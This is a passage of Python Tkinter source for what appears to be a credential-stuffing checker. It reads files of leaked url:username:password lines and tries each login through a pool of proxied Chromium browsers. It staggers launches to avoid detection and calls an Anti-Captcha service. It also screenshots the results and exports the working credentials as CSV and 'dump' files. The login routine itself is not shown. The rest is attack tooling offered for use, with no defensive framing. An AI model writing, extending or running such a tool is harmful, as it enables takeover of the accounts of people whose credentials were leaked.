                    # No cache yet, but byte-offset index exists — seek-based scan.
                    with open(filepath, "rb") as fb:
                        for abs_idx, offset in enumerate(index_snap_check):
                            if start_idx >= 0 and abs_idx < start_idx:
                                continue
                            fb.seek(offset)
                            raw   = fb.readline()
                            entry = parse_credential_line(
                                raw.decode("utf-8", errors="ignore"))
                            if entry is None:
                                continue
                            status = results_snap.get(abs_idx, "Pending")
                            if not _passes(entry, status):
                                continue
                            entry["_abs_idx"] = abs_idx
                            entries_to_check.append(entry)
                else:
                    # Fallback: file not yet indexed — scan linearly.
                    abs_idx = 0
                    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            entry = parse_credential_line(line)
                            if entry is None:
                                continue
                            current_idx = abs_idx
                            abs_idx += 1
                            status = results_snap.get(current_idx, "Pending")
                            if not _passes(entry, status):
                                continue
                            entry["_abs_idx"] = current_idx
                            if start_idx >= 0 and current_idx < start_idx:
                                continue
                            entries_to_check.append(entry)

            # Manual entries are included only if they pass active filters.
            for me in list(self._manual_entries):
                if self._stop_flag.is_set():
                    break
                me_status = results_snap.get(me.get("_abs_idx"), me.get("status", "Pending"))
                if _passes(me, me_status):
                    entries_to_check.append(me)

            if self._group_by_domain_var.get() and entries_to_check:
                entries_to_check = self._group_entries_by_domain_stable(entries_to_check)
                if start_idx >= 0:
                    sel_pos = next(
                        (i for i, e in enumerate(entries_to_check)
                         if e.get("_abs_idx") == start_idx),
                        None,
                    )
                    if sel_pos is not None:
                        entries_to_check = entries_to_check[sel_pos:]

            total_matched = len(entries_to_check)
            self._result_queue.put(("total", total_matched, None, None))

            # ── Adaptive scheduler (live worker count) ────────────────────
            # Keep the pool large enough, but control the EFFECTIVE worker
            # count by limiting in-flight futures to the current spinbox value.
            # This lets users change worker count while Check All is running.
            pool_size = max(1, 20)
            with ThreadPoolExecutor(max_workers=pool_size) as pool:
                running: dict = {}   # future -> entry
                next_i = 0
                launched_workers_peak = 0

                while (next_i < len(entries_to_check) or running) and not self._stop_flag.is_set():
                    desired_workers = max(1, self._concurrency_var.get())

                    # Fill up to the current desired worker count.
                    while (
                        next_i < len(entries_to_check)
                        and len(running) < desired_workers
                        and not self._stop_flag.is_set()
                    ):
                        entry = entries_to_check[next_i]
                        next_i += 1

                        # Mark as "Checking…" immediately
                        self._result_queue.put(
                            ("update", entry["_abs_idx"], entry, "Checking…")
                        )

                        fut = pool.submit(_do_check, entry)
                        running[fut] = entry

                        # Stagger ONLY when opening a new concurrent browser slot.
                        # This avoids "many Chromes at once" but keeps steady-state
                        # throughput high once workers are warm.
                        if len(running) > launched_workers_peak:
                            launched_workers_peak = len(running)
                            if launched_workers_peak > 1:
                                time.sleep(random.uniform(0.3, 1.0))

                    if not running:
                        continue

                    done, _ = wait(
                        running.keys(),
                        timeout=0.25,
                        return_when=FIRST_COMPLETED,
                    )
                    if not done:
                        continue

                    for fut in done:
                        entry = running.pop(fut, None)
                        if entry is None:
                            continue
                        try:
                            done_entry, status, screenshot = fut.result()
                        except Exception as exc:
                            done_entry = entry
                            status = f"ERROR: {exc}"
                            screenshot = None

                        self._result_queue.put(
                            ("update", done_entry["_abs_idx"], done_entry, status, screenshot)
                        )

        except Exception as e:
            self._result_queue.put(("error", 0, None, str(e)))

        self._result_queue.put(("done", 0, None, None))

    def _poll_queue(self):
        BATCH_LIMIT = 300
        processed   = 0
        try:
            while processed < BATCH_LIMIT:
                item = self._result_queue.get_nowait()
                msg, idx, row, status = item[0], item[1], item[2], item[3]
                screenshot = item[4] if len(item) > 4 else None

                if msg == "done":
                    self._check_done()
                    return
                if msg == "error":
                    messagebox.showerror("Check error", status)
                    self._check_done()
                    return
                if msg == "total":
                    self._total_jobs = idx   # idx carries the matched count
                    processed += 1
                    continue
                if msg == "update":
                    # "Checking…" is a live-status notification, not a final result
                    is_interim = (
                        status.startswith("Checking")
                        or status.startswith("CAPTCHA_STATE_")
                    )

                    if not is_interim:
                        self._done_jobs += 1
                        self._results[idx] = status
                        if (
                            "anti-captcha api:" in status.lower()
                            and status not in self._anti_captcha_alerted_messages
                        ):
                            self._anti_captcha_alerted_messages.add(status)
                            messagebox.showerror("Anti-Captcha API error", status)
                        # Update manual entry status in its dict too
                        if idx < 0:
                            for me in self._manual_entries:
                                if me["_abs_idx"] == idx:
                                    me["status"] = status
                                    break

                        sl = status.lower()
                        if "success" in sl:
                            self._cnt_ok += 1
                            self._consecutive_unreachable = 0
                        elif ("failed" in sl or "error" in sl or
                              "unreachable" in sl or "timeout" in sl):
                            self._cnt_fail += 1
                            if "unreachable" in sl:
                                self._consecutive_unreachable += 1
                                try:
                                    _unreachable_limit = max(
                                        1, int(self._auto_stop_unreachable_limit_var.get())
                                    )
                                except Exception:
                                    _unreachable_limit = 10
                                if (
                                    self._auto_stop_unreachable_var.get()
                                    and not self._auto_stop_unreachable_warned
                                    and self._consecutive_unreachable >= _unreachable_limit
                                ):
                                    self._auto_stop_unreachable_warned = True
                                    self._stop_flag.set()
                                    self._statusbar.config(
                                        text=(
                                            f"Stopped: {_unreachable_limit} consecutive "
                                            "UNREACHABLE results — check your proxy/network."
                                        )
                                    )
                                    messagebox.showwarning(
                                        "Auto-stopped",
                                        "Checking was stopped automatically after "
                                        f"{_unreachable_limit} consecutive UNREACHABLE results.\n\n"
                                        "Please verify your proxy settings or "
                                        "network connection before restarting.",
                                    )
                            else:
                                self._consecutive_unreachable = 0
                        else:
                            self._cnt_unknown += 1
                            self._consecutive_unreachable = 0

                        # Store screenshot if one was taken
                        if screenshot is not None and row is not None:
                            self._checker_screenshots.append({
                                "entry":      row,
                                "jpeg_bytes": screenshot,
                                "status":     status,
                            })
                            self._checker_screenshot_map[idx] = screenshot
                            self._btn_view_screenshots.config(state="normal")
                            # Update 📷 column in tree row immediately
                            _ss_iid = str(idx)
                            if self._tree.exists(_ss_iid):
                                _ss_vals = list(self._tree.item(_ss_iid, "values"))
                                while len(_ss_vals) < 8:
                                    _ss_vals.append("")
                                _ss_vals[7] = "📷 View"
                                self._tree.item(_ss_iid, values=_ss_vals)

                    # Manual entries (negative idx) are always visible in tree;
                    # file entries only if on the current page.
                    page_start = self._page_index * PAGE_SIZE
                    is_visible = (idx < 0) or (page_start <= idx < page_start + PAGE_SIZE)
                    if is_visible and row:
                        self._update_tree_row(idx, row, status)
                        if is_interim:
                            if status.startswith("CAPTCHA_STATE_"):
                                self._statusbar.config(
                                    text=f"{status} — {row.get('username','')}  @  {row.get('domain','')}"
                                )
                            else:
                                self._statusbar.config(
                                    text=f"Checking: {row.get('username','')}  @  {row.get('domain','')}"
                                )

                    processed += 1
        except queue.Empty:
            pass

        self._flush_stats()
        self._refresh_proxy_display()
        self._poll_id = self.after(POLL_MS, self._poll_queue)

    def _update_tree_row(self, abs_idx: int, row: dict, status: str):
        iid = str(abs_idx)
        if self._tree.exists(iid):
            tag_alt  = "odd" if abs_idx % 2 else "even"
            tag_st   = self._status_tag(status)
            # Manual entries (negative idx) get a label like "M1", "M2", …
            row_num  = f"M{-abs_idx}" if abs_idx < 0 else abs_idx + 1
            ss_ind = "📷 View" if abs_idx in self._checker_screenshot_map else ""
            self._tree.item(iid,
                values=(row_num, row["domain"], row["url"],
                        row["username"], row["password"], status,
                        self._notes.get(abs_idx, ""), ss_ind),
                tags=(tag_alt, tag_st),
            )

    @staticmethod
    def _fmt_elapsed(seconds: float) -> str:
        h = int(seconds // 3600)
        m = int((seconds % 3600) // 60)
        s = int(seconds % 60)
        if h:
            return f"{h}h {m:02d}m {s:02d}s"
        if m:
            return f"{m}m {s:02d}s"
        return f"{s}s"

    def _active_elapsed(self) -> float:
        """Seconds of active (non-paused) run time so far."""
        if self._check_start_time is None:
            return 0.0
        paused = self._paused_seconds
        if self._pause_started_at is not None:   # currently paused
            paused += time.monotonic() - self._pause_started_at
        return max(0.0, time.monotonic() - self._check_start_time - paused)

    def _flush_stats(self):
        done  = self._done_jobs
        total = self._total_jobs
        pct   = int(done / total * 100) if total else 0
        self._var_total.set(   f"Total: {total:,}")
        self._var_ok.set(      f"Success: {self._cnt_ok:,}")
        self._var_fail.set(    f"Failed: {self._cnt_fail:,}")
        self._var_unknown.set( f"Unknown: {self._cnt_unknown:,}")
        self._var_progress.set(f"Progress: {done:,}/{total:,}  ({pct}%)")
        self._statusbar.config(text=f"Checking {done:,} / {total:,}  ({pct}%)...")
        if self._check_start_time is not None:
            elapsed = self._active_elapsed()
            self._var_elapsed.set(f"⏱ {self._fmt_elapsed(elapsed)}")
            rate = (done / elapsed * 60) if elapsed > 0 else 0
            self._var_rate.set(f"≈ {rate:.1f}/min")

    def _on_close(self):
        """Confirm before closing the window."""
        if self._checking:
            msg = (
                "A credential check is currently running.\n\n"
                "Exit anyway and stop the check?"
            )
        else:
            msg = "Are you sure you want to exit?"

        if messagebox.askyesno("Exit", msg, default="no"):
            self._stop_flag.set()
            if self._poll_id:
                self.after_cancel(self._poll_id)
            self._search_stop_flag.set()
            if self._search_poll_id:
                self.after_cancel(self._search_poll_id)
            self.destroy()

    def _check_done(self):
        if self._poll_id:
            self.after_cancel(self._poll_id)
            self._poll_id = None
        self._checking = False
        self._btn_check.config(state="normal")
        self._btn_stop.config(state="disabled")
        self._btn_pause.config(state="disabled", text="⏸ Pause")
        self._pause_flag.clear()
        self._btn_export.config(state="normal")
        self._btn_dump.config(state="normal")
        self._flush_stats()
        self._var_progress.set(f"Done — {self._done_jobs:,} checked")
        # Freeze timer at final active elapsed
        elapsed = self._active_elapsed()
        rate = (self._done_jobs / elapsed * 60) if elapsed > 0 else 0
        self._var_elapsed.set(f"⏱ {self._fmt_elapsed(elapsed)}")
        self._var_rate.set(f"≈ {rate:.1f}/min")
        self._check_start_time = None
        n_shots = len(self._checker_screenshots)
        done_text = f"Check complete. {self._done_jobs:,} entries processed."
        if n_shots:
            done_text += f"  📷 {n_shots} screenshot(s) captured."
            self._btn_view_screenshots.config(state="normal")
        self._statusbar.config(text=done_text)
        # Release shared browser pool (frees Chromium processes)
        threading.Thread(target=release_browser_pool, daemon=True).start()
        # Refresh current page with final statuses
        self._load_page(self._page_index)

    # ================================================================
    # Screenshot gallery (checker tab)
    # ================================================================

    def _show_checker_screenshots(self, start_idx: int = 0):
        """Open a single slideshow modal for all screenshots. Re-uses the existing
        window if it is already open, navigating to *start_idx* instead."""
        import io as _io

        shots = self._checker_screenshots
        if not shots:
            messagebox.showinfo("No screenshots",
                                "No screenshots have been captured yet.\n"
                                "Set 'Screenshot on' to SUCCESS or FAILED and run Check All.")
            return

        # ── Singleton: if the window is already open, just navigate there ─
        if self._screenshot_win is not None:
            try:
                if self._screenshot_win.winfo_exists():
                    if self._screenshot_navigate is not None:
                        self._screenshot_navigate(
                            max(0, min(start_idx, len(shots) - 1))
                        )
                    self._screenshot_win.lift()
                    self._screenshot_win.focus_force()
                    return
            except Exception:
                pass
            # Window was destroyed without us knowing — fall through to recreate
            self._screenshot_win      = None
            self._screenshot_navigate = None

        try:
            from PIL import Image as _PILImage, ImageTk as _PILImageTk
            _LANCZOS = getattr(_PILImage, "LANCZOS",
                               getattr(_PILImage.Resampling, "LANCZOS", 1))
            _pil_ok = True
        except ImportError:
            _pil_ok = False

        C   = self._palette
        win = tk.Toplevel(self)
        win.title(f"Screenshots  —  {len(shots)} captured")
        win.geometry("1200x860")
        win.configure(bg=C["bg"])
        self._screenshot_win = win

        def _on_win_close():
            self._screenshot_win      = None
            self._screenshot_navigate = None
            win.destroy()

        win.protocol("WM_DELETE_WINDOW", _on_win_close)

        # ── State ─────────────────────────────────────────────────────────
        _idx      = [max(0, min(start_idx, len(shots) - 1))]
        _zoom     = [1.0]
        _orig_img: list = [None]   # original PIL image for current slide
        _photo_ref: list = [None]

        # ── Header: counter + status ──────────────────────────────────────
        header_frame = ttk.Frame(win)
        header_frame.pack(fill="x", padx=8, pady=(6, 2))

        counter_var = tk.StringVar()
        ttk.Label(header_frame, textvariable=counter_var,
                  font=("Consolas", 10, "bold")).pack(side="left")

        row_var = tk.StringVar()
        ttk.Label(header_frame, textvariable=row_var,
                  foreground=C["muted"],
                  font=("Consolas", 10)).pack(side="left", padx=(10, 0))

        status_lbl = ttk.Label(header_frame, text="",
                               foreground=C["accent"],
                               font=("Segoe UI", 9, "italic"))
        status_lbl.pack(side="left", padx=12)

        # ── Layout: use grid so bottom panels are never squeezed out ──────
        win.rowconfigure(1, weight=1)   # canvas row expands
        win.columnconfigure(0, weight=1)

        nav_frame  = ttk.Frame(win)
        cred_outer = ttk.Frame(win)
        zoom_frame = ttk.Frame(win)
        # Row 0 = header (already packed above via pack — switch to grid)
        # We use pack for header then grid for rest; simplest: keep pack for
        # header & use pack order so bottom frames are packed first.
        nav_frame.pack( side="bottom", fill="x", padx=8, pady=(2, 8))
        cred_outer.pack(side="bottom", fill="x", padx=8, pady=(4, 2))
        zoom_frame.pack(side="bottom", fill="x", padx=8, pady=(2, 0))
        ttk.Separator(win, orient="horizontal").pack(side="bottom", fill="x", padx=8)

        # ── Canvas + scrollbars ───────────────────────────────────────────
        canvas_frame = ttk.Frame(win)
        canvas_frame.pack(fill="both", expand=True, padx=8, pady=(4, 0))

        canvas = tk.Canvas(canvas_frame, bg="#1a1a1a", highlightthickness=0)
        vsb = ttk.Scrollbar(canvas_frame, orient="vertical",   command=canvas.yview)
        hsb = ttk.Scrollbar(canvas_frame, orient="horizontal", command=canvas.xview)
        canvas.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        vsb.pack(side="right",  fill="y")
        hsb.pack(side="bottom", fill="x")
        canvas.pack(fill="both", expand=True)

        # ── Zoom controls ─────────────────────────────────────────────────
        _zoom_var = tk.StringVar(value="100%")

        def _render_image():
            """Redraw the current image at _zoom[0] without touching cred fields."""
            canvas.delete("all")
            _photo_ref[0] = None
            img = _orig_img[0]
            if img is None:
                return
            if not _pil_ok:
                canvas.create_text(10, 10, anchor="nw",
                                   text="Install Pillow:\n  pip install Pillow",
                                   fill=C.get("muted", "#888"))
                return
            zoom = _zoom[0]
            new_w = max(1, int(img.width  * zoom))
            new_h = max(1, int(img.height * zoom))
            try:
                disp  = img.resize((new_w, new_h), _LANCZOS) if zoom != 1.0 else img
                photo = _PILImageTk.PhotoImage(disp)
                _photo_ref[0] = photo
                canvas.create_image(0, 0, anchor="nw", image=photo)
                canvas.configure(scrollregion=(0, 0, new_w, new_h))
            except Exception as exc:
                canvas.create_text(10, 10, anchor="nw",
                                   text=f"Cannot display:\n{exc}",
                                   fill=C.get("muted", "#888"))
            _zoom_var.set(f"{int(zoom * 100)}%")

        def _zoom_in(e=None):
            _zoom[0] = min(5.0, round(_zoom[0] * 1.25, 4))
            _render_image()

        def _zoom_out(e=None):
            _zoom[0] = max(0.05, round(_zoom[0] / 1.25, 4))
            _render_image()

        def _zoom_fit():
            img = _orig_img[0]
            if img is None:
                return
            win.update_idletasks()
            cw = max(canvas.winfo_width(),  400)
            ch = max(canvas.winfo_height(), 300)
            _zoom[0] = round(min(cw / img.width, ch / img.height), 4)
            _render_image()

        def _zoom_reset():
            _zoom[0] = 1.0
            _render_image()

        ttk.Button(zoom_frame, text="🔍−", width=4, command=_zoom_out).pack(side="left")
        ttk.Label(zoom_frame, textvariable=_zoom_var, width=6,
                  anchor="center").pack(side="left", padx=2)
        ttk.Button(zoom_frame, text="🔍+", width=4, command=_zoom_in).pack(side="left")
        ttk.Button(zoom_frame, text="Fit",  width=5, command=_zoom_fit).pack(side="left", padx=(6, 2))
        ttk.Button(zoom_frame, text="1:1",  width=5, command=_zoom_reset).pack(side="left")

        def _on_mousewheel(e):
            if e.state & 0x4:  # Ctrl held → zoom
                if e.delta > 0:
                    _zoom_in()
                else:
                    _zoom_out()
            else:
                canvas.yview_scroll(int(-1 * (e.delta / 120)), "units")
        canvas.bind("<MouseWheel>", _on_mousewheel)
        win.bind("<Control-equal>", _zoom_in)
        win.bind("<Control-minus>", _zoom_out)
        win.bind("<Control-0>",     lambda e: _zoom_fit())

        # ── Render function (loads new slide) ─────────────────────────────
        def _render(idx: int):
            item   = shots[idx]
            entry  = item["entry"]
            status = item["status"]
            jpeg   = item["jpeg_bytes"]

            counter_var.set(f"{idx + 1}  /  {len(shots)}")
            color = C.get("green", "#4caf50") if "SUCCESS" in status.upper() \
                    else C.get("red", "#f44336")
            status_lbl.configure(text=f"  {status}", foreground=color)

            _domain_var.set(entry.get("domain", ""))
            _url_var.set(entry.get("url", ""))
            _user_var.set(entry.get("username", ""))
            _pass_var.set(entry.get("password", ""))
            _status_var.set(status)
            _final_url_var.set(item.get("final_url", ""))
            abs_idx = entry.get("_abs_idx")
            if isinstance(abs_idx, int):
                row_text = f"M{-abs_idx}" if abs_idx < 0 else str(abs_idx + 1)
            else:
                row_text = str(idx + 1)
            row_var.set(f"Row: {row_text}")

            _orig_img[0] = None
            if not jpeg:
                canvas.delete("all")
                _photo_ref[0] = None
                canvas.create_text(20, 20, anchor="nw",
                                   text="No screenshot data.",
                                   fill=C.get("muted", "#888"))
                return
            if not _pil_ok:
                canvas.delete("all")
                canvas.create_text(20, 20, anchor="nw",
                                   text="Install Pillow:\n  pip install Pillow",
                                   fill=C.get("muted", "#888"))
                return
            try:
                _orig_img[0] = _PILImage.open(_io.BytesIO(jpeg))
            except Exception as exc:
                canvas.delete("all")
                canvas.create_text(20, 20, anchor="nw",
                                   text=f"Cannot load image:\n{exc}",
                                   fill=C.get("muted", "#888"))
                return
            # Auto-fit new slide, then draw
            _zoom_fit()

        # ── Credential strip ──────────────────────────────────────────────
        _domain_var    = tk.StringVar()
        _url_var       = tk.StringVar()
        _user_var      = tk.StringVar()
        _pass_var      = tk.StringVar()
        _status_var    = tk.StringVar()
        _final_url_var = tk.StringVar()

        # brief "Copied!" flash label shared across all copy buttons
        _copy_notice_id: list = [None]
        _copy_notice_var = tk.StringVar(value="")
        _copy_notice_lbl = ttk.Label(
            cred_outer, textvariable=_copy_notice_var,
            foreground=C.get("green", "#a6e3a1"),
            font=("Segoe UI", 8, "bold"))
        _copy_notice_lbl.pack(side="right", padx=8)

        def _flash_copied(text: str = "✓ Copied!"):
            _copy_notice_var.set(text)
            if _copy_notice_id[0]:
                win.after_cancel(_copy_notice_id[0])
            _copy_notice_id[0] = win.after(1800, lambda: _copy_notice_var.set(""))

        def _make_copy_btn(parent, var, label):
            f = ttk.Frame(parent)
            ttk.Label(f, text=label, font=("Segoe UI", 8, "bold"),
                      foreground=C.get("muted", "#888")).pack(side="left")
            ttk.Entry(f, textvariable=var, state="readonly",
                      width=28).pack(side="left", padx=(2, 1))
            def _copy():
                win.clipboard_clear()
                win.clipboard_append(var.get())
                _flash_copied()
            ttk.Button(f, text="📋", width=3, command=_copy).pack(side="left")
            return f

        row_top = ttk.Frame(cred_outer)
        row_top.pack(fill="x", pady=1)
        _make_copy_btn(row_top, _domain_var,    "Domain:  ").pack(side="left", padx=(0, 12))
        _make_copy_btn(row_top, _url_var,       "URL:     ").pack(side="left", padx=(0, 12))
        _make_copy_btn(row_top, _status_var,    "Status:  ").pack(side="left", padx=(0, 12))

        row_bot = ttk.Frame(cred_outer)
        row_bot.pack(fill="x", pady=1)
        _make_copy_btn(row_bot, _user_var,      "Username:").pack(side="left", padx=(0, 12))
        _make_copy_btn(row_bot, _pass_var,      "Password:").pack(side="left", padx=(0, 12))
        _make_copy_btn(row_bot, _final_url_var, "Final URL:").pack(side="left", padx=(0, 12))

        def _copy_all():
            item  = shots[_idx[0]]
            entry = item["entry"]
            text  = (f"{entry.get('url','')}"
                     f":{entry.get('username','')}"
                     f":{entry.get('password','')}")
            win.clipboard_clear()
            win.clipboard_append(text)
            _flash_copied("✓ All copied!")
        ttk.Button(row_bot, text="📋 Copy All", command=_copy_all).pack(side="left", padx=4)

        # ── Navigation + export ───────────────────────────────────────────
        def _go(delta: int):
            new_idx = (_idx[0] + delta) % len(shots)
            _idx[0] = new_idx
            _render(new_idx)

        # Expose navigation to the singleton guard at the top of this method
        def _navigate(idx: int):
            _idx[0] = max(0, min(idx, len(shots) - 1))
            _render(_idx[0])

        self._screenshot_navigate = _navigate

        ttk.Button(nav_frame, text="◀  Prev", width=10,
                   command=lambda: _go(-1)).pack(side="left", padx=(0, 4))
        ttk.Button(nav_frame, text="Next  ▶", width=10,
                   command=lambda: _go(+1)).pack(side="left", padx=(0, 16))

        def _export():
            folder = filedialog.askdirectory(
                title="Select folder to save screenshots", parent=win)
            if not folder:
                return
            import csv as _csv
            saved = 0
            rows  = []
            for i, item in enumerate(shots):
                entry  = item["entry"]
                jpeg   = item["jpeg_bytes"]
                status = item["status"]
                safe_dom = "".join(c if c.isalnum() or c in "-_." else "_"
                                   for c in entry.get("domain", "unknown"))
                safe_usr = "".join(c if c.isalnum() or c in "-_." else "_"
                                   for c in entry.get("username", "unknown"))
                fname = f"{safe_dom}_{safe_usr}_{i+1}.jpg"
                fpath = os.path.join(folder, fname)
                if jpeg:
                    try:
                        with open(fpath, "wb") as fh:
                            fh.write(jpeg)
                        saved += 1
                    except Exception:
                        fname = "(save error)"
                else:
                    fname = "(no screenshot)"
                rows.append({
                    "domain":   entry.get("domain", ""),
                    "url":      entry.get("url", ""),
                    "username": entry.get("username", ""),
                    "password": entry.get("password", ""),
                    "status":   status,
                    "screenshot_file": fname,
                })
            csv_path = os.path.join(folder, "check_screenshots.csv")
            try:
                with open(csv_path, "w", newline="", encoding="utf-8") as fh:
                    writer = _csv.DictWriter(
                        fh, fieldnames=["domain", "url", "username",
                                        "password", "status", "screenshot_file"])
                    writer.writeheader()
                    writer.writerows(rows)
            except Exception as exc:
                messagebox.showerror("CSV error", str(exc), parent=win)
                return
            messagebox.showinfo(
                "Exported",
                f"Saved {saved} JPEG(s) and check_screenshots.csv to:\n{folder}",
                parent=win)

        ttk.Button(nav_frame, text="⬇ Export JPEGs + CSV",
                   command=_export).pack(side="left")

        # ── Keyboard bindings ─────────────────────────────────────────────
        win.bind("<Left>",  lambda e: _go(-1))
        win.bind("<Right>", lambda e: _go(+1))
        win.bind("<Prior>", lambda e: _go(-1))   # PageUp
        win.bind("<Next>",  lambda e: _go(+1))   # PageDown

        # Render first slide after the window geometry is settled
        win.after(80, lambda si=_idx[0]: _render(si))

    # ================================================================
    # Per-row screenshot click handlers
    # ================================================================

    def _on_tree_click(self, event):
        """Single click on the 📷 column opens the screenshot preview for that row."""
        region = self._tree.identify_region(event.x, event.y)
        if region != "cell":
            return
        column = self._tree.identify_column(event.x)
        if column != "#8":  # 📷 is column 8 (1-based)
            return
        item = self._tree.identify_row(event.y)
        if not item:
            return
        try:
            abs_idx = int(item)
        except ValueError:
            return
        if abs_idx not in self._checker_screenshot_map:
            return
        # Reuse checker slideshow singleton, positioned to this row.
        _shots = self._checker_screenshots
        _start = 0
        for _i, _item in enumerate(_shots):
            _e = _item.get("entry", {})
            if _e.get("_abs_idx") == abs_idx:
                _start = _i
                break
        self._show_checker_screenshots(start_idx=_start)

    def _ctx_view_screenshot(self):
        """Context-menu handler: view screenshot for the selected row."""
        sel = self._tree.selection()
        if not sel:
            return
        try:
            abs_idx = int(sel[0])
        except ValueError:
            return
        jpeg = self._checker_screenshot_map.get(abs_idx)
        if not jpeg:
            messagebox.showinfo(
                "No screenshot",
                "No screenshot was captured for this entry.\n"
                "Enable 'Screenshot on' and re-run Check All.")
            return
        vals   = self._tree.item(sel[0], "values")
        entry  = {
            "domain":   vals[1] if len(vals) > 1 else "",
            "url":      vals[2] if len(vals) > 2 else "",
            "username": vals[3] if len(vals) > 3 else "",
            "password": vals[4] if len(vals) > 4 else "",
        }
        status = vals[5] if len(vals) > 5 else ""
        # Open the full checker slideshow, positioned at the matching entry
        _shots = self._checker_screenshots
        _start = 0
        for _i, _item in enumerate(_shots):
            if _item["jpeg_bytes"] is jpeg:
                _start = _i
                break
        self._show_checker_screenshots(start_idx=_start)

    # ================================================================
    # Copy helpers
    # ================================================================

    def _show_ctx_menu(self, event):
        iid = self._tree.identify_row(event.y)
        if iid:
            self._tree.selection_set(iid)
            try:
                abs_idx = int(iid)
                has_ss  = abs_idx in self._checker_screenshot_map
            except ValueError:
                has_ss = False
            # Context menu item index 6 = "📷 View Screenshot" (0-based)
            self._ctx_menu.entryconfig(6, state="normal" if has_ss else "disabled")
            try:
                self._ctx_menu.tk_popup(event.x_root, event.y_root)
            finally:
                self._ctx_menu.grab_release()

    def _copy_col(self, col_index: int):
        sel = self._tree.selection()
        if not sel:
            return
        vals = self._tree.item(sel[0], "values")
        if col_index < len(vals):
            self.clipboard_clear()
            self.clipboard_append(vals[col_index])
            self._statusbar.config(text=f"Copied: {vals[col_index]}")

    def _copy_row(self):
        sel = self._tree.selection()
        if not sel:
            return
        lines = []
        for iid in sel:
            vals = self._tree.item(iid, "values")
            lines.append(":".join(str(v) for v in vals[2:5]))  # url:user:pass
        self.clipboard_clear()
        self.clipboard_append("\n".join(lines))
        self._statusbar.config(text=f"Copied {len(sel)} row(s) to clipboard.")

    # ================================================================
    # Utils
    # ================================================================

    @staticmethod
    def _status_tag(status: str) -> str:
        s = status.lower()
        if "success" in s:
            return "success"
        if "failed" in s or "error" in s or "unreachable" in s or "timeout" in s:
            return "failed"
        return "unknown"

    def _clear(self):
        return
        if self._poll_id:
            self.after_cancel(self._poll_id)
            self._poll_id = None
        self._stop_flag.set()
        self._pause_flag.clear()
        self._checking    = False
        self._check_start_abs_idx = -1
        self._filepath    = None
        self._total_lines = 0
        self._line_index  = []
        self._page_index  = 0
        self._page_rows   = []
        self._results.clear()
        self._manual_entries.clear()
        self._notes.clear()
        self._cnt_ok = self._cnt_fail = self._cnt_unknown = 0
        self._search_results = None

        self._tree.delete(*self._tree.get_children())
        self._file_var.set("No file selected")
        self._page_var.set("")
        self._var_total.set("Total: 0")
        self._var_ok.set("Success: 0")
        self._var_fail.set("Failed: 0")
        self._var_unknown.set("Unknown: 0")
        self._var_progress.set("")
        for btn in (self._btn_check, self._btn_clear,
                    self._btn_export, self._btn_dump, self._btn_prev, self._btn_next):
            btn.config(state="disabled")
        self._btn_stop.config(state="disabled")
        self._btn_pause.config(state="disabled", text="⏸ Pause")
        self._statusbar.config(text="Ready — open a credential file to begin.")

    def _export(self):
        if self._filepath is None:
            return
        path = filedialog.asksaveasfilename(
            title="Save results",
            defaultextension=".csv",
            filetypes=[("CSV file", "*.csv")],
        )
        if not path:
            return

        self._statusbar.config(text="Exporting...")
        self.update_idletasks()

        # Dump file sits next to the chosen file: same name + _dump.txt
        base, _ext = os.path.splitext(path)
        dump_path  = base + "_dump.txt"

        # Snapshot mutable state for the background thread
        filepath_snap   = self._filepath or ""
        results_snap    = dict(self._results)
        notes_snap      = dict(self._notes)
        index_snap      = list(self._line_index)

        def _worker():
            try:
                written = 0
                BUF = 1 << 20  # 1 MiB write buffer
                csv_lines:  list[str] = []
                dump_lines: list[str] = []
                with open(path,      "w", encoding="utf-8", buffering=BUF) as out, \
                     open(dump_path, "w", encoding="utf-8", buffering=BUF) as dump, \
                     open(filepath_snap, "rb") as src:
                    out.write("Domain,URL,Username,Password,Status,Note\n")
                    for abs_idx, offset in enumerate(index_snap):
                        src.seek(offset)
                        raw   = src.readline()
                        line  = raw.decode("utf-8", errors="ignore")
                        entry = parse_credential_line(line)
                        if entry is None:
                            continue
                        status = results_snap.get(abs_idx, "Pending")
                        if not self._line_passes_all_filters(entry, status):
                            continue
                        note = notes_snap.get(abs_idx, "")
                        csv_lines.append(
                            f'"{entry["domain"]}","{entry["url"]}",'
                            f'"{entry["username"]}","{entry["password"]}",'
                            f'"{status}","{note}"\n'
                        )
                        dump_lines.append(
                            f'{entry["url"]}:{entry["username"]}:{entry["password"]}\n'
                        )
                        written += 1
                        if written % 50_000 == 0:
                            out.writelines(csv_lines)
                            dump.writelines(dump_lines)
                            csv_lines.clear()
                            dump_lines.clear()
                    if csv_lines:
                        out.writelines(csv_lines)
                    if dump_lines:
                        dump.writelines(dump_lines)
                self.after(0, lambda w=written: messagebox.showinfo(
                    "Exported",
                    f"Saved {w:,} rows to:\n{path}\n\nDump also saved to:\n{dump_path}"))
            except Exception as exc:
                self.after(0, lambda e=exc: messagebox.showerror("Export error", str(e)))
            finally:
                self.after(0, lambda: self._statusbar.config(text="Export complete."))

        threading.Thread(target=_worker, daemon=True).start()

    # ================================================================
    # Unique Domains
    # ================================================================

   

    def _show_unique_domains(self):
        """Scan the file for domains and count how many credentials each one has (respecting ALL active filters)."""
        if self._filepath is None:
            return

        # Snapshot ALL filter values for the background thread
        domain_snap   = self._domain_var.get().strip().lower()
        url_kw_snap   = self._url_keyword_var.get().strip().lower()
        user_mode_snap = self._username_filter_var.get()
        status_f_snap = self._status_filter.get()
        filepath      = self._filepath
        results_snap  = dict(self._results)   # copy so background thread is safe

        def _passes(entry: dict, abs_idx: int) -> bool:
            if domain_snap and domain_snap not in entry["domain"].lower() \
                    and domain_snap not in entry["url"].lower():
                return False
            if url_kw_snap and url_kw_snap not in entry["url"].lower():
                return False
            if not self._username_matches_filter(entry["username"], user_mode_snap):
                return False
            # Status filter
            if status_f_snap and status_f_snap != "All":
                status = results_snap.get(abs_idx, "Pending")
                sl = status.lower()
                sf = status_f_snap.lower()
                if sf == "success" and "success" not in sl:
                    return False
                elif sf == "failed" and "failed" not in sl:
                    return False
                elif sf not in ("success", "failed") and sf not in sl:
                    return False
            return True

        # Build result window immediately; show progress while scanning
        C   = self._palette
        win = tk.Toplevel(self)
        win.title("Domain Credential Counts")
        win.geometry("520x560")
        win.minsize(380, 300)

        top_bar = ttk.Frame(win)
        top_bar.pack(fill="x", padx=10, pady=(10, 4))

        count_var = tk.StringVar(value="Scanning…")
        ttk.Label(top_bar, textvariable=count_var,
                foreground=C["accent"]).pack(side="left")

